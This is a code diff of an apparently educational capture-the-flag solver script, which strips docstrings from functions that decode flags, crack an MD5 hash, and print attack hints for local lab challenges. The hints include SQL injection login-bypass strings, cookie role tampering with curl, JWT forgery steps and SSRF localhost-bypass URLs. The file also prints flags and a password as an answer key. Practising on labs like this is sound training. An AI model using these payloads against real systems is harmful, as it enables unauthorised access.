@@ -1,8 +1,4 @@
 #!/usr/bin/env python3
-"""
-Solution scripts for all CTF challenges
-Run with: python3 solve_all.py [challenge_name]
-"""
 
 import base64
 import codecs
@@ -11,37 +7,37 @@ import requests
 import json
 
 def solve_welcome():
-    """Challenge 01: Welcome"""
+    
     print("Solution: The flag is literally in the challenge description!")
     print("Just read it carefully ;)")
     print("flag{welcome_to_college_ctf_2026}")
 
 def solve_base64():
-    """Challenge 02: Base What?"""
+    
     encoded = "ZmxhZ3tiYXNlNjRfaXNfdGhlX2ZpcnN0X3RoaW5nX3lvdV9sZWFybn0="
     decoded = base64.b64decode(encoded).decode()
     print(f"Decoded: {decoded}")
 
 def solve_hex():
-    """Challenge 04: Hex Dump"""
+    
     hex_str = "66 6c 61 67 7b 68 65 78 5f 69 73 5f 63 6f 6f 6c 5f 72 69 67 68 74 7d"
     decoded = bytes.fromhex(hex_str).decode()
     print(f"Decoded: {decoded}")
 
 def solve_caesar():
-    """Challenge 06: Caesar's Secret"""
+    
     cipher = "synt{pnpghzr_frpnyr_gjb_gjb_a}"
     decoded = codecs.decode(cipher, 'rot_13')
     print(f"Decoded: {decoded}")
 
 def solve_rot13():
-    """Challenge 09: ROT13"""
+    
     cipher = "synt{ebg13_vf_n_puvyqref_pvcure}"
     decoded = codecs.decode(cipher, 'rot_13')
     print(f"Decoded: {decoded}")
 
 def solve_cookie(port=5002):
-    """Challenge 05: Cookie Monster"""
+    
     print(f"Accessing http://localhost:{port}")
     print("Change the 'role' cookie from 'guest' to 'admin'")
     print("In browser: F12 → Application → Cookies → role = admin")
@@ -49,7 +45,7 @@ def solve_cookie(port=5002):
     print(f'curl -b "role=admin" http://localhost:{port}')
 
 def solve_sql(port=5003):
-    """Challenge 10: SQL Rookie"""
+    
     print(f"SQL Injection attack on http://localhost:{port}")
     print("\nMethod 1: Username: admin' --  Password: anything")
     print("Method 2: Username: ' OR '1'='1  Password: anything")
@@ -57,7 +53,7 @@ def solve_sql(port=5003):
     print("Username: admin, Password: supersecretpassword123")
 
 def solve_jwt(port=5004):
-    """Challenge 12: Broken Auth (JWT)"""
+    
     print("JWT Token Forgery Attack")
     print("1. Get a token by logging in as any user")
     print("2. Decode at https://jwt.io")
@@ -66,7 +62,7 @@ def solve_jwt(port=5004):
     print("5. Submit the modified token")
 
 def solve_rsa():
-    """Challenge 13: RSA Baby"""
+    
     from sympy import factorint
     
     n = 1000000016000000063
@@ -87,7 +83,7 @@ def solve_rsa():
     print(f"Decrypted: {flag}")
 
 def solve_vigenere():
-    """Challenge 17: Vigenere"""
+    
     def decrypt(ciphertext, key):
         decrypted = []
         key_length = len(key)
@@ -116,7 +112,7 @@ def solve_vigenere():
     print(f"Decrypted: {decrypt(encrypted, key)}")
 
 def solve_md5():
-    """Challenge 20: Weak Hash"""
+    
     target = "d93a5def163fd0788975da8d77626dea"
     
     common_passwords = [
@@ -134,7 +130,7 @@ def solve_md5():
     print("Password not in common list")
 
 def solve_ssrf(port=5008):
-    """Challenge 21: SSRF Master"""
+    
     print("SSRF Bypass Techniques:")
     print("\n1. Decimal IP:")
     print(f"   http://2130706433:9999")
@@ -146,7 +142,6 @@ def solve_ssrf(port=5008):
     print(f"   http://[::1]:9999")
     print("\nTry these URLs in the challenge!")
 
-# Challenge name to solver mapping
 SOLVERS = {
     'welcome': solve_welcome,
     'base64': solve_base64,
